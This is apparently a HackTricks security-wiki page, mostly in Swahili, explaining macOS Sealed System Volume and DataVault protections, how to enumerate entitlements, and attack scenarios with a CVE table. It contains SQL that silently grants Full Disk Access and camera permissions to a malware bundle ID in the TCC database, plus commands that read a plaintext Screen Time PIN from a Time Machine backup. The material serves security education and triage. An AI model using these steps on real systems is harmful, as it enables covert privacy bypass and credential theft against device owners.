# macOS Sealed System Volume & DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Sealed System Volume (SSV)

### Maelezo ya Msingi

Kuanzia **macOS Big Sur (11.0)**, system volume hufungwa kwa njia ya cryptographic kwa kutumia **APFS snapshot hash tree**. Hii huitwa **Sealed System Volume (SSV)**. System partition huwekwa kama **read-only**, na marekebisho yoyote huvunja seal, ambayo huthibitishwa wakati wa boot.<sup>[[11]](#references)</sup>

SSV hutoa:
- **Ugunduzi wa Tampering** — marekebisho yoyote kwenye system binaries/frameworks hubadilisha mzizi wa Merkle-tree na kufanya seal iliyotiwa saini na Apple isiwe halali
- **Uthibitishaji wakati wa Boot** — boot chain huthibitisha system snapshot iliyochaguliwa kabla haijawa root filesystem
- **Ustahimilivu dhidi ya Rootkit** — hata root hawezi kubadilisha faili kwa kudumu katika authenticated system snapshot bila kuzima authenticated root au kuathiri njia ya update iliyoidhinishwa

SSV hulinda volume ya **System**, si volume ya **Data** inayohusishwa nayo na inayoweza kuandikwa. Firmlinks huunganisha volumes zote mbili katika namespace inayoonekana kwenye `/`, kwa hiyo path inayoonekana kuwa inaweza kuandikwa haithibitishi kwamba object ya msingi ni sehemu ya sealed snapshot. FileVault na Data Protection hulinda usiri wa data iliyo kwenye hifadhi; ni tofauti na integrity ya SSV.<sup>[[11]](#references)</sup>

### Kukagua Hali ya SSV
```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / "

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```
### Mwonekano halisi wa mfumo: SSV + Cryptex grafts

Kwenye matoleo ya hivi karibuni ya macOS, si kila executable inayoonekana chini ya `/System` lazima itokane na snapshot ya SSV iliyowashwa. **Cryptexes** ni disk images za APFS zilizothibitishwa kivyake, ambazo maudhui yake hu-graftiwa juu ya directories zilizochaguliwa; kwa hivyo Rapid Security Responses zinaweza kubadilisha components zinazohusiana na usalama bila kujenga upya SSV ya msingi. Unapofanya triage ya persistence au diffing ya system code, hesabu live mounts na Preboot Cryptex store badala ya ku-hash snapshot ya msingi pekee:
```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```
Maelezo ya boot-chain na Rapid Security Response yamefafanuliwa katika [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses); sehemu hii inalenga mpaka wa SSV wenyewe.

### Entitlements za SSV Writers

Baadhi ya Apple system binaries zina entitlements zinazoruhusu kurekebisha au kudhibiti sealed system volume:

| Entitlement | Madhumuni |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Revert system volume hadi snapshot ya awali |
| `com.apple.private.apfs.create-sealed-snapshot` | Create sealed snapshot mpya baada ya system updates |
| `com.apple.rootless.install.heritable` | Write kwenye SIP-protected paths (zinazorithiwa na child processes) |
| `com.apple.rootless.install` | Write kwenye SIP-protected paths |

### Kutafuta SSV Writers
```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```
### Matukio ya Mashambulizi

#### Snapshot Rollback Attack

Ikiwa mshambuliaji ataathiri binary yenye `com.apple.private.apfs.revert-to-snapshot`, anaweza **kurudisha system volume kwenye hali ya kabla ya sasisho**, na kurejesha udhaifu unaojulikana:
```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```
> [!WARNING]
> Kurudisha nyuma Snapshot kwa ufanisi **kunabatilisha masasisho ya usalama**, na kurejesha udhaifu wa kernel na mfumo uliokuwa umesharekebishwa. Hii ni mojawapo ya operesheni hatari zaidi zinazowezekana kwenye macOS za kisasa.

#### Kubadilisha System Binary

Kwa kutumia SIP bypass + uwezo wa kuandika kwenye SSV, mshambulizi anaweza:

1. Kuweka system volume katika hali ya read-write
2. Kubadilisha system daemon au framework library kwa toleo lenye trojan
3. Kuweka muhuri upya snapshot (au kukubali muhuri uliovunjika ikiwa SIP tayari imelegezwa)
4. Rootkit hudumu baada ya kuwasha upya na haionekani kwa zana za utambuzi za userland

### Real-World CVEs

| CVE | Maelezo |
|---|---|
| CVE-2021-30892 | **Shrootless** — SIP bypass inayotumia entitlement ya `system_installd` ya `com.apple.rootless.install.heritable` kuendesha post-install scripts kiholela ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | SIP bypass: `system_installd` iliweka post-install script katika folda inayolindwa na SIP chini ya `/tmp`, lakini `/tmp` yenyewe hailindwi na SIP, hivyo folda hiyo ingeweza kubadilishwa kwa kuweka image juu yake ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — race ya copy-on-write katika XNU inayowezesha kuandika kwenye faili za root-owned zilizo read-only ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Basic Information

**DataVault** ni ulinzi wa filesystem unaodhibitiwa na entitlement kwa faili na directory nyeti. BSD flag `UF_DATAVAULT` (`0x00000080`) huashiria kuwa object inahitaji entitlement kwa ajili ya kusoma na kuandika; tofauti na DAC ya kawaida, kuwa **root** au kupata Full Disk Access pekee hakutoshelezi ukaguzi huo wakati ulinzi unatekelezwa.<sup>[[4]](#references)[[13]](#references)</sup>

Usitumie “DataVault” kama jina mbadala la kila database iliyolindwa. TCC databases hudhibitiwa na sera maalum za TCC/FDA na SIP (tazama [macOS TCC](macos-tcc/README.md)), huku ufikiaji wa keychain item pia ukitegemea Keychain ACLs na ulinzi wa cryptographic (tazama [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Mifano halisi ya DataVault mara nyingi huonekana kama stores zinazomilikiwa na service chini ya `/private/var/folders/.../0/`, kama vile Screen Time store; flag huonekana kama `datavault` katika BSD file flags wakati parent inaweza kufanyiwa stat.

### DataVault Controller Entitlements

| Entitlement | Boundary |
|---|---|
| `com.apple.rootless.datavault.controller` | Kufikia/kudhibiti objects za `UF_DATAVAULT`<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | Kudhibiti maamuzi ya TCC; hii ni boundary ya faragha inayohusiana lakini tofauti |
| `com.apple.private.tcc.allow` | Kupita huduma maalum za TCC zilizotajwa katika thamani ya entitlement |
| `com.apple.rootless.storage.TCC` | Kuandika kwenye TCC store inayolindwa na SIP |

Process inayochanganya entitlement ya DataVault-controller na FDA, backup, indexing, au utendaji wa IPC inavutia hasa: tafuta primitive ya confused-deputy inayokopi object iliyolindwa kwenda kwenye path ya kawaida badala ya kujaribu kufungua vault moja kwa moja.<sup>[[14]](#references)</sup>

### Finding DataVault Controllers
```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```
### Matukio ya Mashambulizi

#### Marekebisho ya Moja kwa Moja ya Hifadhidata ya TCC (mpaka tofauti wa TCC)

Iwapo mshambuliaji atahatarisha process ya msimamizi wa TCC (kwa mfano, kupitia code injection kwenye process yenye `com.apple.private.tcc.manager`), anaweza **kurekebisha moja kwa moja hifadhidata ya TCC** ili kuipa application yoyote ruhusa yoyote ya TCC:<sup>[[12]](#references)</sup>
```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```
> [!CAUTION]
> Marekebisho ya database ya TCC ni **ultimate privacy bypass** — yanatoa ruhusa yoyote kimya kimya, bila prompt yoyote kutoka kwa mtumiaji au kiashirio kinachoonekana. Kihistoria, minyororo kadhaa ya macOS privilege escalation imeishia kwa uandishi kwenye database ya TCC kama payload ya mwisho.

#### Keychain Database Access

Ufikiaji wa moja kwa moja wa database inayohifadhiwa na Keychain si sawa na ufikiaji wa siri zilizo katika plaintext. Ikiwa privilege boundary nyingine inamruhusu mshambuliaji kunakili database, key material na item ACLs bado lazima zishambuliwe; tazama ukurasa maalum wa [macOS Keychain](../../macos-red-teaming/macos-keychain.md) badala ya kudhani kuwa DataVault-controller entitlement inatosha.

#### Backup-copy boundary: Time Machine

Uchambuzi wa 2026 ulionyesha pattern muhimu ya jumla: `backupd` ina `com.apple.rootless.datavault.controller` pamoja na Full Disk Access ili iweze kunakili stores zilizolindwa. Kwenye configuration iliyojaribiwa, `/private/var/folders` ilijumuishwa kwenye Time Machine na backup copy iliyomountiwa haikulazimisha DataVault boundary ya live. Mtafiti alitumia hili kutafuta Screen Time SQLite store na kusoma restrictions PIN yake ya plaintext bila kufungua vault ya live. Chukulia hili kama **copy-boundary attack**: orodhesha deputies za backup, export, migration, indexing, na diagnostics zinazoweza materialize data ya vault chini ya mount au path iliyo dhaifu zaidi.<sup>[[13]](#references)[[14]](#references)</sup>
```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```
Tabia hii inategemea toleo na mpangilio wa backup. Iihakikishe kwenye build lengwa, na kumbuka kwamba eneo la Time Machine lililosimbwa hulinda nakala pekee linapokuwa limefungwa; likishawekwa mount, vidhibiti vyake vya ufikiaji huwa sehemu ya attack surface.

### CVEs za Ulimwengu Halisi Zinazohusisha DataVault/TCC Bypass

| CVE | Maelezo |
|---|---|
| CVE-2024-44131 | Mashindano ya symlink ya FileProvider yanayomwezesha privileged helper kufikia data iliyolindwa na TCC ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | Kama root, **unda user mpya ambaye `NFSHomeDirectory` yake inaelekeza kwenye `TCC.db` inayodhibitiwa na mshambuliaji**; wakati wa login `tccd` huitumia, na ruhusa hizo hutumika, hivyo kufikia data ya users wengine ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | "powerdir": kubadilisha home dir ya user ili kuweka TCC.db inayodhibitiwa na mshambuliaji ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Hitilafu ya bundle-conclusion inayowezesha app **kurithi ruhusa za TCC za donor bundle** bila prompt; ilitumiwa porini na **XCSSET** kupiga screenshot ya desktop ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` iliunda path ya DB kutoka kwa `$HOME`, hivyo `launchctl setenv HOME` iliielekeza kwenye `TCC.db` inayodhibitiwa na mshambuliaji ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` ilikuwa na `com.apple.private.tcc.manager` **na** ilizima library validation, hivyo HAL plug-in iliyowekwa kwenye `/Library/Audio/Plug-Ins/HAL` ingeweza kutoa ruhusa zozote za TCC ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft yagundua vulnerability mpya ya macOS, Shrootless, ambayo inaweza kupita System Integrity Protection](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Uchambuzi wa Kiufundi: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Inafaa Kufanywa Vibaya](https://worthdoingbadly.com/macdirtycow/)
- [4] [Apple Platform Security — Data Protection](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass inaiba data kutoka iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Kugundua Malware ya macOS: Kupita TCC](https://blog.kandji.io/malware-bypass-tcc)
- [7] [Vulnerability mpya ya macOS, "powerdir," inaweza kusababisha ufikiaji wa data ya user bila idhini](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [Zero-Day TCC bypass yagunduliwa katika malware ya XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: Kupita Framework ya macOS Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Cheza muziki na upite TCC, yaani CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [Janga la Apple OTA Updates (APFS Snapshots)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [Jinsi ya kupita Screen Time passcode yako mwenyewe — source na uchambuzi wa Time Machine/DataVault](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
